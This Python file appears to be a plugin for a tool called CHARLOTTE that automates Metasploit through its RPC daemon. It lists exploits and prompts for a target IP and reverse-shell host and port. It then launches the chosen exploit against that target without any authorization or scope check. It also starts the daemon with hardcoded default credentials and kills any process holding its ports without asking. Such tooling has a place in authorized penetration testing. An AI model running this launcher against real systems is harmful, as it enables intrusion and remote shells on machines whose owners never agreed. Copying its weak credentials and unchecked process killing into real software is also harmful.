# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with Metasploit RPC
# Detects port conflicts, safely terminates msfrpcd, and falls back to alternate ports
# Supports exploit lookup, payload selection, and interactive execution
# ******************************************************************************************

import os
import subprocess
import time
import socket
import psutil
from pymetasploit3.msfrpc import MsfRpcClient

# Configuration
DEFAULT_PORT = 55553
FALLBACK_PORTS = [55554, 55555, 55556]
MSF_USER = "msf"
MSF_PASS = "msf"
MSF_HOST = "127.0.0.1"

# ─────────────────────────────────────────────────────────────────────
# Check if port is in use
# ─────────────────────────────────────────────────────────────────────
def is_port_in_use(port, host='127.0.0.1'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((host, port)) == 0

# ─────────────────────────────────────────────────────────────────────
# Get PID using a specific port
# ─────────────────────────────────────────────────────────────────────
def get_pid_using_port(port):
    for conn in psutil.net_connections(kind='tcp'):
        if conn.laddr.port == port and conn.status == psutil.CONN_LISTEN:
            return conn.pid

# ─────────────────────────────────────────────────────────────────────
# Start msfrpcd daemon
# ─────────────────────────────────────────────────────────────────────
def start_msfrpcd(port):
    subprocess.Popen([
        "msfrpcd.bat",
        "-U", MSF_USER,
        "-P", MSF_PASS,
        "-a", MSF_HOST,
        "-p", str(port),
        "-S"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)

# ─────────────────────────────────────────────────────────────────────
# Connect to Metasploit RPC, handling port conflicts
# ─────────────────────────────────────────────────────────────────────
def connect_to_metasploit():
    ports_to_try = [DEFAULT_PORT] + FALLBACK_PORTS
    for port in ports_to_try:
        if is_port_in_use(port):
            print(f"[!] Port {port} is in use by PID {get_pid_using_port(port)}. Attempting to terminate...")
            pid = get_pid_using_port(port)
            if pid:
                try:
                    psutil.Process(pid).terminate()
                    print(f"[+] Killed process using port: {pid}")
                    time.sleep(2)
                except Exception as e:
                    print(f"[!] Failed to terminate process {pid}: {e}")
        print(f"[*] Starting msfrpcd on port {port}...")
        start_msfrpcd(port)
        try:
            client = MsfRpcClient(MSF_PASS, port=port)
            print("[+] Connected to Metasploit RPC!")
            return client
        except Exception:
            print(f"[!] Connection to port {port} failed.")
    raise RuntimeError("[-] Failed to connect to any Metasploit RPC port.")

# ─────────────────────────────────────────────────────────────────────
# Run exploitation flow
# ─────────────────────────────────────────────────────────────────────
def run_metasploit():
    client = connect_to_metasploit()

    print("\n[+] Available Exploits:\n")
    all_exploits = client.modules.exploits
    for idx, name in enumerate(all_exploits[:10], 1):  # Only first 10 for brevity
        print(f"{idx}. {name}")
    
    print("\n[+] Search for 'tomcat':")
    tomcat_matches = [x for x in all_exploits if "tomcat" in x]
    print(tomcat_matches)

    print("\n[+] Running example exploit:")
    chosen_exploit = input("Which exploit would you like to run? (e.g., multi/http/tomcat_mgr_deploy): ").strip()
    target_ip = input("Enter RHOST (target IP): ").strip()
    lhost = input("Enter LHOST (local IP for reverse shell): ").strip()
    lport = input("Enter LPORT (local port for reverse shell): ").strip()

    try:
        exploit = client.modules.use('exploit', chosen_exploit)
        payloads = exploit.target_compatible_payloads()
        if not payloads:
            raise Exception("No compatible payloads found for this exploit.")

        print(f"\n[+] Compatible payloads:")
        for i, p in enumerate(payloads, 1):
            print(f"{i}. {p}")

        payload_choice = input(f"Select payload [1-{len(payloads)}] or press Enter for default: ").strip()
        selected_payload = payloads[int(payload_choice)-1] if payload_choice else payloads[0]
        payload = client.modules.use('payload', selected_payload)

        # Set options
        exploit['RHOSTS'] = target_ip
        payload['LHOST'] = lhost
        payload['LPORT'] = lport

        print(f"[*] Launching exploit {chosen_exploit} with payload {selected_payload}...")
        job_id = exploit.execute(payload=payload)
        print(f"[+] Exploit launched as job ID: {job_id}")

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")

    print("[*] Metasploit interaction complete.")

# ─────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    run_metasploit()
# ==========================================================================================
# END OF FILE
# ==========================================================================================
